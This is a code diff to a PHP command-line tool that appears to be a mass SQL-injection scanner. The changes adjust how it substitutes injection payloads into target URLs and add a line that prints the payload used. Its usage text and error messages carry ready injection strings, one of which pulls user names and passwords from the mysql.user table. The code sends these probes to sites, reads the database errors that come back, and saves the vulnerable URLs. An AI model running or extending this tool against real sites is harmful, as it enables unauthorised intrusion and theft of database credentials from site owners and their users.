@@ -40,7 +40,6 @@
  * 
  */
 
-//0x272D2D3B
 system("command clear");
 error_reporting(0);
 set_time_limit(0);
@@ -235,8 +234,6 @@ function menu() {
      Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
               --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
               --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
-
-
 ");
 }
 
@@ -266,7 +263,7 @@ function bannerLogo() {
 #SUBUSTITUIR VALORES NA URL#####################################################
 
 function replace($exploit, $url) {
-    $exploit = strstr($_SESSION["config"]['replace'], '[INURL]') ? $exploit : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
+    $exploit = strstr($_SESSION['config']['replace'], '[INURL]') ? $exploit : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
     $exploit = explode("[INURL]", $exploit);
     $exploit[0] = (isset($exploit[0]) && !is_null($exploit[0])) ? $exploit[0] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
     $exploit[1] = (isset($exploit[0]) && !is_null($exploit[1])) ? $exploit[1] : sair(bannerLogo() . "\033[1;37m0x\033[0m\033[02;31mDEFINE THE CORRECT REPLACE COMMAND ex: --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user+from+mysql.user+limit+0,1)=1'\033[0m\n\r");
@@ -618,8 +615,11 @@ function infoServer($url_, $postDados = NULL) {
 
 function processoUrlExec($url, $contUrl) {
     plus();
+
     $host = urldecode($_SESSION['config']['tipoerro'] == '3' ? filtroHostname($url) : ($url));
-    $host = replace($_SESSION['config']['replace'], $host);
+
+    $host = (!is_null($_SESSION['config']['replace'])) ? replace($_SESSION['config']['replace'], $host) : $host;
+
     $info = infoserver(gerarErroDB($host), $_SESSION['config']['exploit-post']);
     if (is_null($_SESSION['config']['extrai-email']) && is_null($_SESSION['config']['extrai-url'])) {
         $url_ = urldecode($url);
@@ -630,6 +630,7 @@ function processoUrlExec($url, $contUrl) {
         echo "\033[1;37m[+]----------------------------------------------------------------------------------------------------------------------------------\033[0m\n";
         echo "\033[1;37m0x| \033[0m[ \033[1;37m{$contUrl}\033[0m ] => \033[02;31m{$_SESSION['config']['vull_style']}{$url_}\033[0m\n";
         echo "\033[1;37m0x| \033[0m\033[02;31mExploit:: \033[0m\033[1;31m{$exget}{$expost}\033[0m\n";
+        echo "\033[1;37m0x| \033[0m\033[02;31mReplace:: \033[0m\033[1;31m{$_SESSION['config']['replace']}\033[0m\n";
         echo "\033[1;37m0x| \033[0m\033[02;31mExtra info:: \033[0m\033[0;31m{$info}\033[1;37m\n";
         echo "\033[1;37m0x| \033[0m\033[02;31mError found:: \033[0;31m" . (isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn']) ? "\033[0;32m{$_SESSION['config']['erroReturn']}" : "0xNO INFORMATION") . "\033[0m";
         ((isset($_SESSION['config']['erroReturn']) && !empty($_SESSION['config']['erroReturn'])) ? salvarTXT($_SESSION['config']['arquivo_output'], "{$url}{$exget}{$expost}", 1) : null);
